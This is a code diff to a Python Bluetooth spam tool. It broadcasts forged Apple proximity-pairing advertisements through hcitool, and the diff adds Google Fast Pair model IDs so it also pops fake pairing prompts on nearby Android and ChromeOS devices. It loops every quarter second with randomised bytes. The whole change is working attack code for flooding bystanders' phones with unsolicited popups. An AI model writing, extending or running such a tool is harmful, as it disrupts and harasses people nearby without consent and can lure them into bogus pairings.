@@ -20,11 +20,30 @@ _PAYLOADS = {
     'watch':       ['0e','19','01','02','20','75','aa','30','01','00','00','45','12','00','00','00','00','00','00','00','00','00'],
 }
 
+# Google Fast Pair model IDs (service data UUID 0xFE2C) — triggers setup popup on Android/ChromeOS
+_FAST_PAIR_MODELS = [
+    ['2a','95','6f'],  # Pixel Buds A-Series
+    ['11','86','f7'],  # Pixel Buds Pro
+    ['f5','6d','23'],  # Generic BT headphones
+    ['d4','61','44'],  # JBL Tune 760NC
+    ['01','52','8c'],  # Sony WH-1000XM4
+    ['4f','b2','1c'],  # Samsung Galaxy Buds
+]
+
 _state = {'running': False, 'count': 0, 'popup_type': 'airpods', 'thread': None}
 
 
 def _send(payload):
     args = ['1e', '02', '01', '1a', '1a', 'ff', '4c', '00'] + payload
+    subprocess.run(
+        ['hcitool', '-i', 'hci0', 'cmd', '0x08', '0x0008'] + args,
+        capture_output=True, timeout=3
+    )
+
+
+def _send_fast_pair(model):
+    # Google Fast Pair: service data UUID 0xFE2C + 3-byte model ID
+    args = ['0a', '02', '01', '02', '06', '16', '2c', 'fe'] + model
     subprocess.run(
         ['hcitool', '-i', 'hci0', 'cmd', '0x08', '0x0008'] + args,
         capture_output=True, timeout=3
@@ -39,16 +58,38 @@ def _loop(popup_type, types_list):
         bases = [list(v) for v in _PAYLOADS.values()]
     else:
         bases = [list(_PAYLOADS.get(popup_type, _PAYLOADS['airpods']))]
-    if not bases:
+    # Separate Apple and Google Fast Pair types
+    google = [t for t in (types_list or []) if t == 'google_fp']
+    apple_types = [t for t in (types_list or []) if t != 'google_fp'] if types_list else None
+
+    if apple_types:
+        bases = [list(_PAYLOADS[t]) for t in apple_types if t in _PAYLOADS]
+    elif popup_type == 'google_fp':
+        bases = []
+    elif popup_type == 'all':
+        bases = [list(v) for v in _PAYLOADS.values()]
+    else:
+        bases = [list(_PAYLOADS.get(popup_type, _PAYLOADS['airpods']))]
+    if not bases and not google:
         bases = [list(_PAYLOADS['airpods'])]
-    idx = 0
+
+    fp_idx = 0
+    apple_idx = 0
     while _state['running']:
-        payload = list(bases[idx % len(bases)])
-        idx += 1
-        payload[-1] = f'{random.randint(0, 255):02x}'
-        payload[-2] = f'{random.randint(0, 255):02x}'
-        _send(payload)
-        _state['count'] += 1
+        # Send Apple popup
+        if bases:
+            payload = list(bases[apple_idx % len(bases)])
+            apple_idx += 1
+            payload[-1] = f'{random.randint(0, 255):02x}'
+            payload[-2] = f'{random.randint(0, 255):02x}'
+            _send(payload)
+            _state['count'] += 1
+        # Send Google Fast Pair popup
+        if google or popup_type == 'google_fp':
+            model = list(_FAST_PAIR_MODELS[fp_idx % len(_FAST_PAIR_MODELS)])
+            fp_idx += 1
+            _send_fast_pair(model)
+            _state['count'] += 1
         time.sleep(0.25)
     subprocess.run(['hciconfig', 'hci0', 'noleadv'], capture_output=True)
 
